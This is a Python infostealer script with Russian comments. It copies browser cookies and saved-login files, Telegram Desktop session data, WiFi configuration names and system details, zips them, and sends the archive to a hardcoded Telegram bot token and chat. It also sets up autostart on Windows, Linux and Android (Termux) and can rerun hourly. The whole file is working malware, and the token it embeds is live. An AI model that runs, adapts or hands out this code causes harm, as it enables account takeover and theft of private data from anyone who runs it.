# -------------------------
# --- created by KALI ---
# -------------------------

import datetime
import platform
import shutil
import os
import socket
import tempfile
import requests
import json
import subprocess
import sys
import time
from zipfile import ZipFile
import telebot

TOKEN = "8343681510:AAE31p5brPooeuYomXvYIj4QVMo5Ppb4fWs"
ID = "-4797934700"

bot = telebot.TeleBot(token=TOKEN)

# Определяем тип системы
def get_system_type():
    system = platform.system().lower()
    if system == "windows":
        return "windows"
    elif system == "linux":
        try:
            with open('/system/build.prop', 'r') as f:
                return "android"
        except:
            return "linux"
    elif system == "darwin":
        return "macos"
    else:
        return "unknown"

SYSTEM_TYPE = get_system_type()

def get_ip():
    try:
        response = requests.get('https://api.ipify.org/', timeout=10)
        return response.text
    except:
        try:
            response = requests.get('https://ident.me/', timeout=5)
            return response.text
        except:
            return "Не удалось получить IP"

def get_username():
    try:
        if SYSTEM_TYPE == "windows":
            return os.getlogin()
        else:
            return os.environ.get('USER', os.environ.get('USERNAME', 'Unknown'))
    except:
        return "Unknown"

def send_startup_notification():
    """Отправляет уведомление о запуске с IP адресом"""
    try:
        user_name = get_username()
        ip_address = get_ip()
        os_info = platform.platform()
        
        message_text = (
            f"🚀 Скрипт запущен на {SYSTEM_TYPE.upper()}!\n"
            "—————————————————————————————\n"
            f"👤 Пользователь: {user_name}\n"
            f"🌐 IP адрес: {ip_address}\n"
            f"💻 Система: {os_info}\n"
            f"🕐 Время запуска: {datetime.datetime.now().strftime('%H:%M:%S')}\n"
            "—————————————————————————————\n"
            "⏳ Сбор данных..."
        )
        
        bot.send_message(chat_id=ID, text=message_text, parse_mode=None)
        print("✅ Уведомление о запуске отправлено")
        return True
    except Exception as e:
        print(f"❌ Ошибка отправки уведомления: {e}")
        return False

def get_system_info():
    try:
        info = {
            'system_type': SYSTEM_TYPE,
            'computer_name': platform.node(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'os_version': platform.version(),
            'python_version': platform.python_version(),
            'platform': platform.platform()
        }
        return info
    except:
        return {}

def copy_file(src_path, dst_path):
    if os.path.exists(src_path):
        try:
            os.makedirs(os.path.dirname(dst_path), exist_ok=True)
            if os.path.isdir(src_path):
                shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dst_path)
            return True
        except Exception as e:
            print(f"Ошибка копирования {src_path}: {e}")
            return False
    return False

def find_files_by_keywords(base_path, keywords, max_depth=3):
    """Ищет файлы по ключевым словам в указанной директории"""
    found_files = []
    try:
        for root, dirs, files in os.walk(base_path):
            # Ограничиваем глубину поиска
            current_depth = root[len(base_path):].count(os.sep)
            if current_depth > max_depth:
                continue
                
            for file in files:
                file_lower = file.lower()
                if any(keyword.lower() in file_lower for keyword in keywords):
                    found_files.append(os.path.join(root, file))
            
            for dir in dirs:
                dir_lower = dir.lower()
                if any(keyword.lower() in dir_lower for keyword in keywords):
                    found_files.append(os.path.join(root, dir))
    except Exception as e:
        print(f"Ошибка поиска в {base_path}: {e}")
    
    return found_files

def get_browser_paths():
    """Возвращает пути к браузерам с поиском по ключевым словам"""
    browsers = {}
    
    if SYSTEM_TYPE == "windows":
        username = get_username()
        browsers = {
            'Chrome': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome',
                'keywords': ['chrome', 'google', 'user data', 'default', 'cookies', 'login data']
            },
            'Firefox': {
                'path': f'C:\\Users\\{username}\\AppData\\Roaming\\Mozilla',
                'keywords': ['firefox', 'mozilla', 'profiles', 'cookies.sqlite', 'logins.json']
            },
            'Edge': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Microsoft',
                'keywords': ['edge', 'microsoft', 'user data', 'default', 'cookies']
            },
            'Opera': {
                'path': f'C:\\Users\\{username}\\AppData\\Roaming\\Opera Software',
                'keywords': ['opera', 'stable', 'cookies', 'login data']
            },
            'Yandex': {
                'path': f'C:\\Users\\{username}\\AppData\\Local\\Yandex',
                'keywords': ['yandex', 'browser', 'user data', 'default']
            }
        }
    else:  # Linux, Android, macOS
        home_dir = os.path.expanduser("~")
        browsers = {
            'Chrome': {
                'path': home_dir,
                'keywords': ['chrome', 'google-chrome', 'config', '.config', 'cookies', 'login data']
            },
            'Firefox': {
                'path': home_dir,
                'keywords': ['firefox', 'mozilla', '.mozilla', 'profiles', 'cookies.sqlite']
            },
            'Chromium': {
                'path': home_dir,
                'keywords': ['chromium', '.config', 'chromium', 'default', 'cookies']
            },
            'Brave': {
                'path': home_dir,
                'keywords': ['brave', 'brave-browser', '.config', 'cookies', 'user data']
            },
            'Opera': {
                'path': home_dir,
                'keywords': ['opera', '.config', 'opera', 'cookies', 'login data']
            }
        }
    
    return browsers

def copy_browsers_data(report_dir):
    """Копирует данные браузеров с поиском по ключевым словам"""
    browsers_data = {}
    browsers = get_browser_paths()
    
    for browser_name, browser_info in browsers.items():
        base_path = browser_info['path']
        keywords = browser_info['keywords']
        
        if os.path.exists(base_path):
            print(f"🔍 Поиск {browser_name} в {base_path}...")
            found_items = find_files_by_keywords(base_path, keywords)
            
            if found_items:
                browser_dir = os.path.join(report_dir, "Browsers", browser_name)
                os.makedirs(browser_dir, exist_ok=True)
                
                copied_files = []
                for item_path in found_items:
                    try:
                        item_name = os.path.basename(item_path)
                        dst_path = os.path.join(browser_dir, item_name)
                        
                        if copy_file(item_path, dst_path):
                            copied_files.append(item_name)
                            print(f"   ✅ Найден: {item_name}")
                    except Exception as e:
                        print(f"   ❌ Ошибка копирования {item_path}: {e}")
                
                if copied_files:
                    browsers_data[browser_name] = copied_files
                    print(f"✅ {browser_name}: скопировано {len(copied_files)} файлов")
                else:
                    print(f"⚠️  {browser_name}: файлы не скопированы")
            else:
                print(f"❌ {browser_name}: файлы не найдены по ключевым словам")
        else:
            print(f"❌ {browser_name}: базовый путь не существует - {base_path}")
    
    return browsers_data

def get_telegram_paths():
    """Пути к Telegram с поиском по ключевым словам"""
    paths = []
    
    if SYSTEM_TYPE == "windows":
        username = get_username()
        paths = [
            f'C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop',
            f'C:\\Users\\{username}\\Documents\\Telegram Desktop'
        ]
    else:
        home_dir = os.path.expanduser("~")
        paths = [
            home_dir,
            '/usr/share',
            '/opt',
            '/var/lib'
        ]
    
    return paths

def copy_telegram_sessions(report_dir):
    """Копирует сессии Telegram с поиском по ключевым словам"""
    sessions_found = []
    telegram_paths = get_telegram_paths()
    telegram_keywords = ['telegram', 'tdata', 'tg', 'telegramdesktop', 'D877F783D5D3EF8C']
    
    for base_path in telegram_paths:
        if os.path.exists(base_path):
            print(f"🔍 Поиск Telegram в {base_path}...")
            found_items = find_files_by_keywords(base_path, telegram_keywords, max_depth=4)
            
            for item_path in found_items:
                try:
                    item_name = os.path.basename(item_path)
                    dst_path = os.path.join(report_dir, "Telegram", item_name)
                    
                    if copy_file(item_path, dst_path):
                        sessions_found.append(item_path)
                        print(f"   ✅ Найдена сессия: {item_name}")
                except Exception as e:
                    print(f"   ❌ Ошибка копирования Telegram: {e}")
    
    return sessions_found

def setup_autostart():
    """Настраивает автозагрузку скрипта"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        if SYSTEM_TYPE == "windows":
            # Автозагрузка в Windows
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            bat_path = os.path.join(startup_dir, 'system_report.bat')
            
            bat_content = f'''
@echo off
python "{script_path}"
exit
'''
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            print(f"✅ Автозагрузка Windows настроена: {bat_path}")
            
        elif SYSTEM_TYPE == "linux":
            # Автозагрузка в Linux
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            
            desktop_path = os.path.join(autostart_dir, 'system_report.desktop')
            desktop_content = f'''
[Desktop Entry]
Type=Application
Name=System Report
Exec=python3 "{script_path}"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
'''
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            print(f"✅ Автозагрузка Linux настроена: {desktop_path}")
            
        elif SYSTEM_TYPE == "android":
            # Для Android можно использовать termux-boot
            boot_dir = "/data/data/com.termux/files/home/.termux/boot"
            os.makedirs(boot_dir, exist_ok=True)
            
            boot_script = os.path.join(boot_dir, 'system_report.sh')
            boot_content = f'''
#!/data/data/com.termux/files/usr/bin/sh
sleep 10
python "{script_path}"
'''
            with open(boot_script, 'w') as f:
                f.write(boot_content)
            os.chmod(boot_script, 0o755)
            print(f"✅ Автозагрузка Android настроена: {boot_script}")
            
        return True
    except Exception as e:
        print(f"❌ Ошибка настройки автозагрузки: {e}")
        return False

def get_wifi_info():
    """Получает информацию о WiFi"""
    wifi_info = []
    
    try:
        if SYSTEM_TYPE == "windows":
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'All User Profile' in line:
                            ssid = line.split(':')[1].strip()
                            wifi_info.append({'ssid': ssid, 'password': 'Требует админ прав'})
            except:
                wifi_info.append({'ssid': 'Информация недоступна', 'password': 'Требуются права'})
        
        else:
            try:
                # Поиск WiFi конфигураций по ключевым словам
                search_paths = ['/etc', '/etc/NetworkManager', os.path.expanduser("~")]
                wifi_keywords = ['wifi', 'network', 'wpa', 'supplicant', 'nmconnection']
                
                for base_path in search_paths:
                    if os.path.exists(base_path):
                        found_items = find_files_by_keywords(base_path, wifi_keywords, max_depth=2)
                        for item in found_items:
                            wifi_info.append({'ssid': os.path.basename(item), 'password': 'Конфигурационный файл'})
            except:
                wifi_info.append({'ssid': 'Информация недоступна', 'password': 'Требуются права'})
    
    except Exception as e:
        print(f"Ошибка получения WiFi информации: {e}")
    
    return wifi_info

def create_info_file(report_dir, browsers_data, telegram_sessions, wifi_info, system_info):
    """Создает файл с информацией о системе"""
    try:
        info_content = [
            "=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===",
            f"Тип системы: {system_info.get('system_type', 'N/A').upper()}",
            f"Имя пользователя: {get_username()}",
            f"Имя компьютера: {system_info.get('computer_name', 'N/A')}",
            f"Процессор: {system_info.get('processor', 'N/A')}",
            f"Архитектура: {system_info.get('architecture', 'N/A')}",
            f"Версия ОС: {system_info.get('os_version', 'N/A')}",
            f"Python версия: {system_info.get('python_version', 'N/A')}",
            f"Платформа: {system_info.get('platform', 'N/A')}",
            f"IP адрес: {get_ip()}",
            f"Время сбора: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "=== ДАННЫЕ БРАУЗЕРОВ ==="
        ]
        
        for browser, files in browsers_data.items():
            info_content.append(f"{browser}: {len(files)} файлов")
        
        info_content.extend([
            "",
            "=== ТЕЛЕГРАМ СЕССИИ ===",
            f"Найдено сессий: {len(telegram_sessions)}",
            ""
        ])
        
        for session in telegram_sessions[:5]:  # Первые 5 сессий
            info_content.append(f"Сессия: {os.path.basename(session)}")
        
        info_content.extend([
            "",
            "=== WI-FI СЕТИ ===",
            f"Найдено конфигураций: {len(wifi_info)}",
            ""
        ])
        
        for wifi in wifi_info[:5]:  # Первые 5 сетей
            info_content.append(f"Сеть: {wifi['ssid']}")
        
        info_file = os.path.join(report_dir, "system_info.txt")
        with open(info_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(info_content))
        
        return info_file
    except Exception as e:
        print(f"Ошибка создания файла информации: {e}")
        return None

def send_file(file_path: str):
    """Отправляет файл с данными"""
    try:
        user_name = get_username()
        ip_address = get_ip()
        system_info = get_system_info()
        
        message_text = (
            f"📦 Автоматический отчет с {SYSTEM_TYPE.upper()}!\n"
            "—————————————————————————————\n"
            f"👤 Пользователь: {user_name}\n"
            f"🌐 IP адрес: {ip_address}\n"
            f"💻 Система: {system_info.get('platform', 'N/A')}\n"
            f"🕐 Время: {datetime.datetime.now().strftime('%H:%M:%S')}\n"
            "—————————————————————————————"
        )
        
        bot.send_message(chat_id=ID, text=message_text, parse_mode=None)
        
        with open(file_path, "rb") as file:
            bot.send_document(ID, file, caption=f"📦 Автоотчет {SYSTEM_TYPE}: {os.path.basename(file_path)}")
            
    except Exception as e:
        print(f"Ошибка при отправке: {e}")

def check_internet():
    """Проверяет подключение к интернету"""
    try:
        socket.create_connection(("api.telegram.org", 443), timeout=10)
        return True
    except:
        return False

def main():
    """Основная функция"""
    if not check_internet():
        print("❌ Нет подключения к интернету")
        return
    
    print(f"🔄 Запуск на системе: {SYSTEM_TYPE.upper()}")
    print("🔄 Сбор данных...")
    
    # Отправляем уведомление о запуске
    send_startup_notification()
    
    # Настраиваем автозагрузку
    if "--no-autostart" not in sys.argv:
        setup_autostart()
    
    # Создаем временные директории
    temp_dir = tempfile.mkdtemp()
    report_dir = os.path.join(temp_dir, "report")
    os.makedirs(report_dir, exist_ok=True)
    
    # Собираем данные
    print("📊 Сбор системной информации...")
    system_info = get_system_info()
    
    print("🌐 Сбор данных браузеров...")
    browsers_data = copy_browsers_data(report_dir)
    
    print("📱 Поиск Telegram сессий...")
    telegram_sessions = copy_telegram_sessions(report_dir)
    
    print("📶 Сбор WiFi информации...")
    wifi_info = get_wifi_info()
    
    print("📝 Создание файла информации...")
    create_info_file(report_dir, browsers_data, telegram_sessions, wifi_info, system_info)
    
    # Создаем архив если есть данные
    if any([browsers_data, telegram_sessions]):
        time_upload = datetime.datetime.now().strftime("%H%M%S")
        username = get_username()
        arc_name = f"AutoReport_{SYSTEM_TYPE}_{username}_{time_upload}.zip"
        
        try:
            with ZipFile(arc_name, "w") as zipfile:
                for root, dirs, files in os.walk(report_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, report_dir)
                        zipfile.write(file_path, arcname)
            
            print("📤 Отправка данных...")
            send_file(arc_name)
            
            # Очистка
            if os.path.exists(arc_name):
                os.remove(arc_name)
                
        except Exception as e:
            print(f"❌ Ошибка при создании архива: {e}")
    else:
        print("⚠️  Данные для отправки не найдены")
    
    # Очищаем временную папку
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
    
    print("✅ Выполнение завершено!")

if __name__ == "__main__":
    # Если первый аргумент --daemon, запускаем в фоновом режиме
    if "--daemon" in sys.argv:
        while True:
            main()
            # Ждем 1 час перед следующим запуском
            time.sleep(3600)
    else:
        main()